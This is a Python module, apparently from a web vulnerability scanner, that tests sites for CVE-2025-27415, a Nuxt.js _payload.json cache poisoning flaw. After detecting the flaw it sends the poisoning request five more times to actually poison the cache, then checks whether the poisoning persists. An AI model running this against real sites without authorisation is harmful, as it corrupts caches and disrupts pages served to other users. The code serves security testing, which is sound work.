#!/usr/bin/env python3

"""
Based on Zhero research
https://zhero-web-sec.github.io/research-and-things/nuxt-show-me-your-payload
"""

from modules.cp_cve.unrisk_page import get_unrisk_page
from utils.style import Colors, Identify
from utils.utils import configure_logger, requests, sys, urljoin

logger = configure_logger(__name__)


def is_json_response(response: requests.Response) -> bool:
    """
    Vérifie si une réponse est du JSON (par parsing ou Content-Type)
    
    Args:
        response: Réponse HTTP
        
    Returns:
        True si la réponse est JSON
    """
    try:
        response.json()
        return True
    except requests.exceptions.JSONDecodeError:
        return "application/json" in response.headers.get("Content-Type", "")


def build_payload_url(base_url: str) -> str:
    """
    Construit l'URL du payload Nuxt.js
    
    Args:
        base_url: URL de base
        
    Returns:
        URL du fichier _payload.json
    """
    if base_url.endswith("/"):
        return f"{base_url}_payload.json"
    else:
        return f"{base_url}/_payload.json"


def test_nuxt_poisoning(
    poison_url: str,
    baseline_url: str,
    s: requests.Session,
    custom_header: dict,
    authent: tuple[str, str] | None,
) -> tuple[bool, str]:
    """
    Teste l'empoisonnement du cache Nuxt.js
    
    Args:
        poison_url: URL du payload _payload.json
        baseline_url: URL de base pour comparaison
        s: Session requests
        custom_header: Headers personnalisés
        authent: Credentials optionnels
        
    Returns:
        Tuple (is_vulnerable, detection_type)
    """
    try:
        # Requête baseline sans cache poisoning
        req_baseline = s.get(
            baseline_url,
            verify=False,
            auth=authent,
            timeout=10,
            allow_redirects=False,
        )

        # Requête vers _payload.json avec headers malveillants
        req_poison = s.get(
            poison_url,
            verify=False,
            auth=authent,
            headers=custom_header,
            timeout=10,
            allow_redirects=False,
        )
        
        # Détection 1: Réponse JSON sur _payload.json
        if is_json_response(req_poison):
            return (True, "JSON_RESPONSE")
        
        # Détection 2: Status code différent (et non erreur commune)
        if (
            req_poison.status_code != req_baseline.status_code
            and req_poison.status_code not in [404, 429, 403]
        ):
            return (True, f"DIFFERENT_STATUS {req_baseline.status_code} > {req_poison.status_code}")
        
        return (False, "NO_DETECTION")
        
    except Exception as e:
        logger.exception(f"Error testing Nuxt poisoning: {e}")
        return (False, f"ERROR: {e}")


def verify_cache_persistence(
    poison_url: str,
    baseline_url: str,
    s: requests.Session,
    custom_header: dict,
    authent: tuple[str, str] | None,
) -> tuple[bool, str]:
    """
    Vérifie la persistence du cache empoisonné
    
    Args:
        poison_url: URL du payload _payload.json
        baseline_url: URL de base
        s: Session requests
        custom_header: Headers personnalisés
        authent: Credentials optionnels
        
    Returns:
        Tuple (is_persisted, detection_type)
    """
    try:
        # Requête baseline pour référence
        req_baseline = s.get(
            baseline_url,
            verify=False,
            auth=authent,
            timeout=10,
            allow_redirects=False,
        )
        
        # Requête de vérification SANS headers malveillants
        req_verify = s.get(
            baseline_url,
            verify=False,
            auth=authent,
            headers=custom_header,
            timeout=10,
            allow_redirects=False,
        )
        
        # Vérification de persistence via JSON
        if is_json_response(req_verify):
            return (True, "CACHE_POISONED_JSON")
        
        # Vérification via status code
        if (
            req_verify.status_code != req_baseline.status_code
            and req_verify.status_code not in [404, 429, 403]
        ):
            return (True, f"CACHE_POISONED_STATUS {req_baseline.status_code} > {req_verify.status_code}")
        
        return (False, "NO_PERSISTENCE")
        
    except Exception as e:
        logger.exception(f"Error verifying cache persistence: {e}")
        return (False, f"ERROR: {e}")


def nuxt_check(
    url: str,
    s: requests.Session,
    req_main: requests.Response,
    custom_header: dict,
    authent: tuple[str, str] | None,
) -> None:
    """
    Vérifie la vulnérabilité CVE-2025-27415 (Nuxt.js _payload.json cache poisoning)
    
    Args:
        url: URL cible
        s: Session requests
        req_main: Réponse baseline de la page
        custom_header: Headers personnalisés
        authent: Credentials optionnels
    """
    try:
        # Recherche d'une page sans risque
        unrisk_page = get_unrisk_page(url, s, req_main)
        
        if not unrisk_page:
            print(
                " └─ [i] [CVE-2025-27415] Seems Nuxt.js framework is used, but no risk-free pages found. Manual check required."
            )
            return
        
        # Construction de l'URL du payload
        poison_url = build_payload_url(unrisk_page)
        
        # Test d'empoisonnement initial
        is_vulnerable, detection_type = test_nuxt_poisoning(
            poison_url,
            unrisk_page,
            s,
            custom_header,
            authent
        )
        
        if is_vulnerable:
            print(
                f" {Identify.behavior} | CVE-2025-27415 | {detection_type} | {Colors.BLUE}{poison_url}{Colors.RESET}"
            )
            
            # Empoisonnement du cache
            for _ in range(5):
                s.get(
                    poison_url,
                    verify=False,
                    auth=authent,
                    headers=custom_header,
                    timeout=10,
                    allow_redirects=False,
                )
            
            # Vérification de la persistence
            is_persisted, persist_type = verify_cache_persistence(
                poison_url,
                unrisk_page,
                s,
                custom_header,
                authent
            )
            
            if is_persisted:
                print(
                    f" {Identify.confirmed} | CVE-2025-27415 | {persist_type} | {Colors.BLUE}{poison_url}{Colors.RESET}"
                )
            else:
                print(
                    f" └─ [i] Vulnerability detected but cache not persistently poisoned"
                )
        
    except requests.Timeout as t:
        logger.error(f"request timeout: {t}")
    except KeyboardInterrupt:
        print("Exiting")
        sys.exit()
    except Exception as e:
        logger.exception(f"Error checking CVE-2025-27415: {e}")